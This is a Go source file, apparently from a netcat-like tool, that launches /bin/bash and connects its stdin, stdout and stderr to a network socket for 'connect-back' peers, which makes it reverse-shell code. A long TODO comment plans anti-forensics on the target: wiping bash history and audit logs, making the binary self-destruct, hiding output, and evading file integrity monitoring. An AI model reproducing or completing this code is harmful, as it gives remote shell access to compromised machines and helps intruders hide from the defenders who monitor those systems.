/*
	This code is intentionally redundant.
	I'm trying to re-implement a similar logic as connection.go
	so I can do unit testing WITHOUT creating a real shell process.
	This is unfinished right now, but expect test methods/ structs
	which match the ones implemented below in a fasion similar to
	connection.go.
*/

package utils

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"time"
)

// Interface used to blueprint the RealShell struct & eventually TestShell struct:
type BashShell interface {
	StartShell(*RealSocket) error
	PipeStdin() *io.WriteCloser
	PipeStdout() *io.ReadCloser
	PipeStderr() *io.ReadCloser
}

type ShellGetter interface {
	// Used to check the real (RealShellGetter) & test (TestShellGetter) structs:
	// GetOffenseInitiatedShell() BashShell // Return RealShell OR TestShell, blueprinted against BashShell interface: <-------- eventually this will be a thing
	GetConnectBackInitiatedShell() (BashShell, error)
}

type RealShellGetter struct {
	// Leave empty
}

// Holds the REAL shell process/ Cmd struct (from exec pkg):
type RealShell struct {
	RrealShell *exec.Cmd
}

// Get shell for Offense-initiated peer:
// func (g RealShellGetter) GetOffenseInitiatedShell() BashShell {
//
// }

// Get shell for CB-initiated peer:
func (g RealShellGetter) GetConnectBackInitiatedShell() (BashShell, error) {
	// If bash exists on the system, find it, save the path:
	var pointerToShell *RealShell

	bashPath, err := exec.LookPath(`/bin/bash`) // bashPath @0xfaraday
	if err != nil {
		return nil, err
	}

	// Initiate bShell with the struct & process created by exec.Command:
	pointerToShell = &RealShell{RrealShell: exec.Command(bashPath)}

	// Get the pointer to the shell process and & return it:
	return pointerToShell, nil
}

// This essentially wraps the actual exec.Cmd.Start() method:
func (s *RealShell) StartShell(socketPointer *RealSocket) error {
	socket := *socketPointer
	commandPending := true
	var returnErr error

	// Create readers & writers for io.Copy():
	stderrReader, _ := s.RrealShell.StderrPipe()
	stdoutReader, _ := s.RrealShell.StdoutPipe()
	stdinWriter, _ := s.RrealShell.StdinPipe()

	socketWriter, _ := socket.RrealSocket.(io.Writer)
	socketReader, _ := socket.RrealSocket.(io.Reader)

	// Start the shell:
	var erR error = s.RrealShell.Start()
	if erR == nil {
		// If no error, call wait (which is blocking):
		go func() {
			erR = s.RrealShell.Wait()
			if erR != nil {
				returnErr = fmt.Errorf("Error waiting for cmd.Exe (Bash shell): %v\n", erR)
				return
			}
		}()
	} else {
		returnErr = fmt.Errorf("Error starting Bash shell: %v\n", erR)
		return returnErr
	}

	// Copy stdout to socket:
	go func(stdout io.ReadCloser, socket io.Writer) {
		_, erR = io.Copy(socket, stdout)
		if erR != nil {
			returnErr = fmt.Errorf("Error copying Stdout of Bash process to socket: %v\n", erR)
			return
		}
		commandPending = false
	}(stdoutReader, socketWriter)

	// Copy stderr to socket:
	go func(stderr io.ReadCloser, socket io.Writer) {
		_, erR = io.Copy(socket, stderr)
		if erR != nil {
			returnErr = fmt.Errorf("Error copying Stderr of Bash process to socket: %v\n", erR)
			return
		}
		commandPending = false
	}(stderrReader, socketWriter)

	// Copy socket to stdin:
	go func(socket io.Reader, stdin io.WriteCloser) {
		commandPending = true
		_, err := io.Copy(stdin, socket)
		if err != nil {
			returnErr = fmt.Errorf("Error copying socket to Stdin of Bash shell: %v\n", err)
			return
		}
	}(socketReader, stdinWriter)

	//	For loop for stuff:
	for {
		if commandPending {
			// Timeout (give the for loop something to do)
			time.Sleep(300 * time.Millisecond)
		}

		if returnErr != nil {
			return returnErr
		}
		/*  FINISH UP REV SHELL BRANCH:
			Commands to look into:
				history
					leave no history but allow user to see history if they want
						something np keeps track of?
						~/.bash_history
						default: 1000 commands
					clean up script
						delete history from session?
						What else does bash log?
						audit logs
						- get rid of np binary / script
							--self-destruct

					keeping track of the history




			x Fix infinite for loop
			- Clean up output on the target
					- logging/printing/banner
					- do we want to log somewhere other than the host?
						- create a file to log to and then destroy after?
						- keep logs/ errors internal (don't allow NP's stdeer/stdout output anywhere?)
					- if connection, we can send debug/ log stuff through connection
						if not, oh well

			- figure out config files being loaded by the shell
					- make sure stdout and stderr are ONLY going to the socket
					- noprofile?
					- noorc?


			- test code
		   	- Prompt:
		   			standard shell prompt (user@host:/current/working/dir: > )
		   				- capture that in a variable
		   					- update on every loop?
		   					- struct remembering some state stuff (dir, user, some other shit)

		   				- OR get it from the process?
		   					- struct
		    					- check to see if those things have changed,
		   						update it if yes


						- from the offense
							append a commands to the user's input
								"whoami"
								echo $USER/$PWD: && whoami
							- tiny bash script:
								- save the echo $USER@$HOSTNAME prompt string in a variable
									as well as the output from the commmand being sent by user
									and run that script to combine them into the prompt...

						- ORRRRR
							- can we print the prompt using somme type of bash internal/ environment thing?
			* file integrity monitoring

		*/
	}
}

// Wrap the ACTUAL exec.Cmd.StdinPipe() method:
func (s *RealShell) PipeStdin() *io.WriteCloser {
	// Establish pipe to bash stdin:
	bashIn, eRr := s.RrealShell.StdinPipe()
	if eRr != nil {
		fmt.Printf("Error creating shell STDIN pipe (shell.go): %v\n", eRr)
		os.Stderr.WriteString(" " + eRr.Error() + "\n")
		os.Exit(1)
	}

	// Get pointer to stdin pipe writer & return it:
	//stdinWriter := bashIn.(io.Writer)
	var pointerToBashInWriter *io.WriteCloser = &bashIn
	fmt.Printf("Stdin address (shell.go) = %p\n", pointerToBashInWriter)
	return pointerToBashInWriter
}

// Wrap the ACTUAL exec.Cmd.StdoutPipe() method:
func (s *RealShell) PipeStdout() *io.ReadCloser {
	// Establish pipe to bash stdout:
	bashOut, erro := s.RrealShell.StdoutPipe()
	if erro != nil {
		fmt.Printf("Error creating shell STDOUT pipe (shell.go): %v\n", erro)
		os.Stderr.WriteString(" " + erro.Error() + "\n")
		os.Exit(1)
	}

	// Get pointer to stdout pipe & return it:
	var pointerToBashOut *io.ReadCloser = &bashOut
	fmt.Printf("Stdout address (shell.go) = %p\n", pointerToBashOut)
	return pointerToBashOut
}

// Wrap the ACTUAL exec.Cmd.StderrPipe() method:
func (s *RealShell) PipeStderr() *io.ReadCloser {
	// Establish pipe to bash stderr:
	bashErr, eRro := s.RrealShell.StderrPipe()
	if eRro != nil {
		fmt.Printf("Error creating shell STDERR pipe (shell.go): %v\n", eRro)
		os.Stderr.WriteString(" " + eRro.Error() + "\n")
		os.Exit(1)
	}

	// Get pointer to stderr pipe & return it:
	var pointerToBashErr *io.ReadCloser = &bashErr
	fmt.Printf("Stderr address (shell.go) = %p\n", pointerToBashErr)
	return pointerToBashErr
}
